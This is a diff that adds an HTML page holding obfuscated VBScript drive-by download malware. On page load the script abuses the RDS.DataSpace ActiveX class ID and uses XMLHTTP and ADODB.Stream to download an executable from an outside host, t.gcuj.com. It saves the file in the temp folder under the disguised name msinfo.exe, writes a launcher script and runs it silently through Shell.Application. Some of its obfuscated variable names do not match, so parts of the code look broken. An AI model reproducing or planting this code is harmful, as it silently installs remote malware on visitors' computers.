@@ -1,0 +1,74 @@
+<html><body><center><script>
+AiLiAn="http://t.gcuj.com/0.exe"
+</script>
+<noscript> 
+<iframe src=*></iframe> 
+</noscript>
+<sCrIpT LaNgUaGe="VBScript">
+On eRrOr rEsUmE NeXt
+zHaNjUfAn="o"&"b"&"j"
+zHaNjUlAnG="e"&"c"&"t"
+ZhAnJuFaNlAnG=ZhAnJuFaN&ZhAnJuLaNg
+ZhAnFaN="c"&"l"
+zHaNlAnG="a"&"s"&"s"
+ZhAnZi="i"&"d"
+ZhAnAiLiAn=zHaNfAn&zHaNlAnG&ZhAnZi
+ZhAnJuF="c"&"l"&"s"
+ZhAnJuFa="i"&"d"&":"
+zHaNfAn="B"&"D"&"9"&"6C"&"55"&"6"&"-"
+zHaNcEn="6"&"5"&"A"&"3"&"-"&"1"&"1"&"D"&"0"
+zHaNc="-9"&"8"&"3A"&"-"
+ZhAnJuZ="0"&"0"&"C"&"0"&"4"
+ZhAnJuI="F"&"C"&"2"&"9"&"E"&"3"&"6"
+ZhAnJuLaNg=zHaNjUf&zHaNjUfA&ZhAnFaN&ZhAnCeN&ZhAnC&ZhAnJuZ&ZhAnJuI
+zHaNf="M"&"i"&"c"
+zHaNfA="r"&"o"&"s"
+ZhAnFn="o"&"f"&"t"&"."
+ZhAnCn="X"&"M"&"L"
+zHaNn="H"&"T"
+ZhAnZ="T"&"P"
+zHaNjUzI=ZhAnF&ZhAnFa&zHaNfN&ZhAnCn&zHaNn&zHaNz
+ZhEf="S"&"c"&"r"&"i"
+ZhEfA="p"&"ti"&"n"&"g"&"."
+ZhEfN="F"&"i"&"l"&"e"&"S"
+ZhEcN="y"&"s"&"t"&"e"
+zHeN="m"&"O"&"b"
+ZhEz="j"&"e"&"c"&"t"
+ZhEzI=ZhEf&zHeFa&zHeCn&zHeCn&zHeN&ZhEz
+ZhAnXu="Set"&" Wuer"&" ="&" HUA.GetSpecialFolder(2)"
+SeT Zi = dOcUmEnT.CrEaTeElEmEnT(ZhAnJuFaNlAnG)
+Zi.sEtAtTrIbUtE ZhAnAiLiAn, ZhAnJuLaNg
+ZhOnGjIeZhE=ZhAnJuZi
+SeT ZhOnGjIe = zI.CrEaTeObJeCt(zHoNgJiEzHe,"")
+ZhOnGjIe.oPeN "GE"&"T", aIlIaN, fAlSe
+ZhOnGjIe.sEnD
+zHaNlAnGuSeR="msinfo.exe"
+ZhAnLaNgOsEr="msinfo.vbs"
+sEt hUa = zI.CrEaTeObJeCt(zHeZi,"")
+SeT WdUeR =hUa.gEtSpElAnGzI
+zHaNxU
+zHaNlAnGuSeR=HuA.BuIlDpAtH(WuEr,zHaNlAnGuSeR)
+ZhAnLaNgOsEr=hUa.bUiLdPaTh(wUeR,ZhAnLaNgOsEr)
+zH="A"&"d"
+hU="o"&"d"
+wA="b"&"."&"s"&"t"
+lU="r"&"e"&"a"&"m"
+zHoGhAwNgLo=zH&Hu&wA&Lu
+SeT LaNg = zI.CrEaTeObJeCt(zHoGhAwNgLo,"")
+LaNg.tYpE=1
+lAnG.OpEn
+LaNg.wRiTe zHoNgJiE.ReSpOnSeBoDy
+LaNg.sAvEtOfIlE ZhAnLaNgUsEr,2
+LaNg.cLoSe
+LaNg.tYpE=2
+lAnG.OpEn
+LaNg.wRiTeTeXt "Set Shell = CreateObject(""Wscript.Shell"")"&VbCrLf&"Shell.Run ("""&ZhAnLaNgUsEr&""")"&VbCrLf&"Set Shell = Nothing"
+lAnG.SaVeToFiLe zHaNlAnGoSeR,2
+lAnG.ClOsE
+fLaNg="S"&"h"&"e"
+aLaNg="l"&"l"&"."
+nLaNg="A"&"p"&"p"&"l"&"i"
+wAnGlUoLaNg=fLaNg&aLaNg&nLaNg
+SeT ZhOnG = Zi.cReAtEoBjEcT(WaNgLuOlAnG&"cation","")
+ZhOnG.ShElLeXeCuTe zHaNlAnGoSeR,"","","Open",0
+</ScRiPt> 
